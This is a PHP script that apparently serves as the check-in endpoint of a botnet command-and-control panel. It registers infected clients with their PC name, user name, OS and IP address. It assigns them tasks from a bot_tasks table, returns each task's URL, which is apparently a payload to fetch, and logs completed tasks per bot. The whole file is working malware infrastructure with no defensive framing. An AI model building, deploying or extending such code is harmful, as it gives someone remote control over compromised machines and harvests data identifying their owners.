<?php
include 'connection.php';

if (isset($_POST['uid'])) {

	$stmt = $conn -> prepare("SELECT * FROM bot_client WHERE uid=:uid");
	$stmt -> execute(array("uid" => $_POST['uid']));
	$clientRow = $stmt -> fetch(PDO::FETCH_ASSOC);

	if ($stmt -> rowCount() > 0) {
		// we have this user
		$arr = array();

		// check if task id is recived
		if (isset($_POST['task_start'])) {
			$stmt = $conn -> prepare("SELECT * FROM bot_tasks WHERE id=:id");
			$stmt -> execute(array("id" => $_POST['task_start']));
			$taskRow = $stmt -> fetch(PDO::FETCH_ASSOC);

			exit($taskRow['url']);
		} elseif (isset($_POST['task_end'])) {

			// if task is already present then push else add new
			if ($clientRow['task_id'] != 0) {

				// check if string contains comma
				if (strpos($clientRow['task_id'], ',') !== false) {
					// string is an array type
					$arr = explode(",", $clientRow['task_id']);
					array_push($arr, $_POST['task_end']);

					$stmt = $conn -> prepare("UPDATE bot_client SET task_id = :task_id WHERE uid = :uid");
					$stmt -> execute(array("task_id" => implode($arr, ","), "uid" => $_POST['uid']));
				} else {
					// push the new data
					$arr = (array)$clientRow['task_id'];
					array_push($arr, $_POST['task_end']);

					$stmt = $conn -> prepare("UPDATE bot_client SET task_id = :task_id WHERE uid = :uid");
					$stmt -> execute(array("task_id" => implode($arr, ","), "uid" => $_POST['uid']));

				}

			} else {
				$stmt = $conn -> prepare("UPDATE bot_client SET task_id = :task_id WHERE uid = :uid");
				$stmt -> execute(array("task_id" => $_POST['task_end'], "uid" => $_POST['uid']));
			}

			exit("OK");
		}

		// find the task
		$arr = explode(",", $clientRow['task_id']);

		$stmt = $conn -> query("SELECT * FROM bot_tasks WHERE is_limit=0 AND is_end=0");
		while ($taskRow = $stmt -> fetch(PDO::FETCH_ASSOC)) {
			if (in_array($taskRow['id'], $arr) == FALSE) {
				exit($taskRow['id']);
			}
		}

		exit("0");
		
	} else {
		// add new user
		$stmt = $conn -> prepare("INSERT INTO bot_client (uid, pc_name, user_name, os_name, ip_addr) VALUES (:uid, :pc_name, :user_name, :os_name, :ip_addr)");
		$stmt -> execute(array("uid" => $_POST['uid'], "pc_name" => $_POST['pc_name'], "user_name" => $_POST['user_name'], "os_name" => $_POST['os_name'], "ip_addr" => $_SERVER['REMOTE_ADDR']));

		// find the task
		$stmt = $conn -> query("SELECT * FROM bot_tasks WHERE is_limit=0 AND is_end=0");
		$taskRow = $stmt -> fetch(PDO::FETCH_ASSOC);

		if ($stmt -> rowCount() > 0) {
			exit($taskRow['id']);
		} else {
			exit("0");
		}
	}

} else {
	die("Wrong way!!!");
}
?>